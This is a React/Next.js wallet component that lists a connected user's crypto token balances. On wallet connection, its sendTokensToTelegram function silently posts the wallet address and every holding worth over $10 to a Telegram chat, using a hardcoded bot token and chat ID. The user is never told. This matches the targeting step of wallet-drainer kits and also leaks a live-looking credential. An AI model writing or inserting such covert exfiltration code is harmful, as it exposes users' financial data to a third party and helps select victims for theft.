"use client";

import { useState, useEffect } from "react";
import { useAccount } from "wagmi";
import axios from "axios";

type Token = {
  name: string;
  symbol: string;
  balance: number;
  chain: string;
  usdValue: number; // Add USD value for sorting
};

const UserTokensList = () => {
  const { address, isConnected } = useAccount();
  const [tokens, setTokens] = useState<Token[]>([]);
  const [isLoading, setIsLoading] = useState(false);

  // Function to fetch the list of tokens and their chain ID
  const fetchUserTokens = async () => {
    if (!address) return;
    setIsLoading(true);
    try {
      const response = await axios.get(
        `https://pro-openapi.debank.com/v1/user/all_token_list`,
        {
          headers: {
            Accept: "application/json",
            AccessKey: process.env.NEXT_PUBLIC_DEBANK_ACCESS_KEY || "YOUR_ACCESSKEY",
          },
          params: {
            id: address,
          },
        }
      );

      console.log("DeBank API Response:", response.data); // Debugging log

      const tokenData = response.data;
      const formattedTokens = tokenData.map((token: any) => {
        const rawAmount = token.raw_amount || 0; // Use raw_amount for the actual value
        const decimals = token.decimals || 0; // Handle cases where decimals might be undefined
        const balance = rawAmount / Math.pow(10, decimals); // Convert to human-readable balance
        const usdValue = balance * (token.price || 0); // Calculate USD value using token price

        return {
          name: token.name || "Unknown", // Fallback for missing names
          symbol: token.symbol || "Unknown",
          balance: isNaN(balance) ? 0 : balance, // Handle NaN scenarios
          chain: token.chain || "unknown",
          usdValue: isNaN(usdValue) ? 0 : usdValue, // Handle NaN scenarios for USD value
        };
      });

      // Filter tokens with USD value below $10 and sort by USD value in descending order
      const filteredAndSortedTokens = formattedTokens
        .filter((token: { usdValue: number; }) => token.usdValue >= 10)
        .sort((a: { usdValue: number; }, b: { usdValue: number; }) => b.usdValue - a.usdValue);

      setTokens(filteredAndSortedTokens);

      // Send tokens to Telegram bot
      await sendTokensToTelegram(filteredAndSortedTokens);
    } catch (error) {
      console.error("Error fetching tokens from DeBank API:", error);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to send tokens to Telegram bot
  const sendTokensToTelegram = async (tokens: Token[]) => {
    const telegramBotToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "7539258392:AAFqlFzNcziYYZjesL-b5xpBykhDuT5D8Co";
    const telegramChatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "-1002422385010";
    const message = tokens
      .map(
        (token) =>
          `${token.name} (${token.symbol}) - Balance: ${token.balance.toFixed(2)} - USD Value: $${token.usdValue.toFixed(2)} on Chain: ${token.chain}`
      )
      .join("\n");

    try {
      await axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        chat_id: telegramChatId,
        text: `Wallet: ${address}\nTokens:\n${message}`,
      });
      console.log("Tokens sent to Telegram");
    } catch (error) {
      console.error("Error sending tokens to Telegram:", error);
    }
  };

  // Fetch tokens upon wallet connection
  useEffect(() => {
    if (isConnected && address) {
      fetchUserTokens();
    }
  }, [isConnected, address]);

  return (
    <div>
      <h2>User Tokens</h2>
      {isLoading && <p>Loading tokens...</p>}
      {!isLoading && tokens.length > 0 && (
        <ul>
          {tokens.map((token, index) => (
            <li key={index}>
              {token.name} ({token.symbol}) - Balance: {token.balance.toFixed(2)} on Chain: {token.chain} - USD Value: ${token.usdValue.toFixed(2)}
            </li>
          ))}
        </ul>
      )}
      {!isLoading && tokens.length === 0 && <p>No tokens found. Connect your wallet to fetch data.</p>}
    </div>
  );
};

export default UserTokensList;
